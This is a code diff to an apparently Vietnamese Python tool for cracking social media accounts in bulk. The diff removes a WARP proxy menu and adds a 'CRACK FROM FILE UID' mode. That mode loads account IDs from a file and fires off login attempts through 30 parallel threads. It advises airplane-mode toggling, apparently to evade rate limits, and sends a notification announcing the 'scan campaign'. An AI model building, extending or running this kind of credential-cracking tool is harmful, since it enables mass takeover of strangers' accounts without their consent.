@@ -95,19 +95,7 @@ if not load_success:
         }, f, indent=4)
     print("\033[1;32m[✓] Đã lưu thông tin vào config.json!\033[0m")
 
-print("\033[1;36m[+] Cấu hình Cloudflare Warp 1.1.1.1:\033[0m")
-print("    1. Bật WARP (SOCKS5 40000)")
-print("    2. Không dùng proxy")
-warp_choice = safe_input("\033[1;36m[?] Nhập lựa chọn (1/2): \033[0m")
-PROXIES = {
-    'http':  'socks5h://127.0.0.1:40000',
-    'https': 'socks5h://127.0.0.1:40000'
-} if warp_choice == '1' else None
-
-if warp_choice == '1':
-    print("\033[1;32m[+] Đã kích hoạt WARP 1.1.1.1!\033[0m")
-else:
-    print("\033[1;33m[+] Chạy trực tiếp không proxy!\033[0m")
+PROXIES = None
 
 print("\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
 
@@ -439,6 +427,8 @@ def old_clone():
     linex()
     print('       \x1b[38;5;196m(\x1b[1;37mD\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m2004-2007 series')
     linex()
+    print('       \x1b[38;5;196m(\x1b[1;37mE\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mCRACK FROM FILE UID')
+    linex()
     _input = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
     if _input in ('A', 'a', '01', '1'):
         old_One()
@@ -448,6 +438,8 @@ def old_clone():
         old_Tree()
     elif _input in ('D', 'd', '04', '4'):
         old_Four()
+    elif _input in ('E', 'e', '05', '5'):
+        old_Five()
     else:
         print(f"\n[×]{rad} Choose Value Option... ")
         BNG_71_()
@@ -603,6 +595,59 @@ def old_Four():
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break
 
+
+def old_Five():
+    """
+    Cloning method for accounts from File UID.
+    """
+    user = []
+    ____banner____()
+    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mCRACK FROM FILE UID")
+    linex()
+    ____banner____()
+    file_path = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mFILE PATH (Default: uid.txt) {Y}:{G} ").strip()
+    if not file_path:
+        file_path = 'uid.txt'
+    try:
+        with open(file_path, 'r') as f:
+            lines = f.read().splitlines()
+    except Exception as e:
+        print(f"\n    {rad}[!] File Not Found or Error: {e}")
+        time.sleep(2)
+        return old_clone()
+
+    for line in lines:
+        if not line.strip(): continue
+        uid = line.split('|')[0].strip()
+        if uid.isdigit():
+            user.append(uid)
+            
+    if not user:
+        print(f"\n    {rad}[!] Warning: No valid UIDs found in {file_path}!")
+        time.sleep(2)
+        return old_clone()
+        
+    print(f"\n    {G}[+] Successfully loaded {len(user)} UIDs!{W}")
+    time.sleep(1)
+
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
+    linex()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {len(user)}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
+        linex()
+        send_notification(f"🚀 Bắt đầu chiến dịch Scan File UID!\n🎯 Số lượng: {len(user)}\n⚙️ Loại: {'METHOD 1' if meth == 'A' else 'METHOD 2'}")
+        for uid in user:
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+            else:
+                print(f"    {rad}[!] INVALID METHOD SELECTED")
+                break
 
 def login_1(uid):
     """
